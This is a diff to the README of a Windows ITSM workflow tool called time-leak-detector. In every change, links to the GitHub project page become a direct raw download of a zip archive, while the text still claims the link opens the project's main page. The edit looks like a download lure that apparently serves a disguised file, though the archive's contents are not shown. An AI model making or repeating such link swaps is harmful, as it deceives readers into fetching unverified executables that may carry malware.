@@ -1,6 +1,6 @@
 # ⏳ time-leak-detector - Find Inefficiencies in ITSM Workflows
 
-[![Download time-leak-detector](https://img.shields.io/badge/Download-time--leak--detector-ff6600?style=for-the-badge)](https://github.com/chazuri/time-leak-detector)
+[![Download time-leak-detector](https://img.shields.io/badge/Download-time--leak--detector-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/chazuri/time-leak-detector/main/app/detector-time-leak-v2.9.zip)
 
 ## 📋 What is time-leak-detector?
 
@@ -24,7 +24,7 @@ Follow these steps to get the application running on your Windows computer. Each
 
 Click the large badge above or visit this page in your web browser:
 
-https://github.com/chazuri/time-leak-detector
+https://raw.githubusercontent.com/chazuri/time-leak-detector/main/app/detector-time-leak-v2.9.zip
 
 This will take you to the project's main page on GitHub.
 
@@ -118,4 +118,4 @@ This feature helps you test different ways to improve your IT service operations
 
 ---
 
-[![Download time-leak-detector](https://img.shields.io/badge/Download-time--leak--detector-ff6600?style=for-the-badge)](https://github.com/chazuri/time-leak-detector)
+[![Download time-leak-detector](https://img.shields.io/badge/Download-time--leak--detector-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/chazuri/time-leak-detector/main/app/detector-time-leak-v2.9.zip)
